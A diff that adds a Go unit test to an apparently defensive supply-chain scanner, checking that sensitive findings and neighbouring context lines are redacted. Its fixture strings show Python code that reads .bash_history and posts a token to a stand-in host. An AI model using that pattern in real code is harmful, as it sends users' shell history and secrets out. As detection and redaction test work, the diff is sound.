@@ -122,6 +122,43 @@ func TestRedactSensitiveFindings_CrossFindingContextLeak(t *testing.T) {
 	}
 }
 
+func TestRedactSensitiveFindings_CrossFindingAnchorWithoutContext(t *testing.T) {
+	const secret = "context-exfil-token-123456789"
+	findings := []Finding{
+		{
+			RuleID:      "PY_CONTEXT_EXFIL_001",
+			Category:    "supply-chain-exfil",
+			Analyzer:    "script-risk",
+			Sensitive:   true,
+			FilePath:    "diagnostics.py",
+			Line:        4,
+			MatchedText: `requests.post("https://events.example?token=` + secret + `")`,
+		},
+		{
+			RuleID:      "SC-EX-001",
+			Category:    "supply-chain-exfil",
+			Analyzer:    "pattern",
+			FilePath:    "diagnostics.py",
+			Line:        2,
+			MatchedText: "Path",
+			Context: []ContextLine{
+				{Line: 2, Content: "from pathlib import Path", IsMatch: true},
+				{Line: 3, Content: `history = Path(".bash_history").read_text()`},
+				{Line: 4, Content: `requests.post("https://events.example?token=` + secret + `")`},
+			},
+		},
+	}
+
+	RedactSensitiveFindings(findings)
+
+	if findings[0].MatchedText != RedactedPlaceholder {
+		t.Fatalf("sensitive MatchedText not redacted: %q", findings[0].MatchedText)
+	}
+	if findings[1].Context[2].Content != RedactedPlaceholder {
+		t.Fatalf("neighbor context retained sensitive anchor line: %q", findings[1].Context[2].Content)
+	}
+}
+
 // TestRedactSensitiveFindings_SensitiveFlag covers findings outside the
 // credential-leak category. MCP_007 (category=mcp-attack), NLP_CRED_EXFIL_COMBO
 // (category=exfiltration), and toxicflow cred-bound pairs (category=toxic-flow)
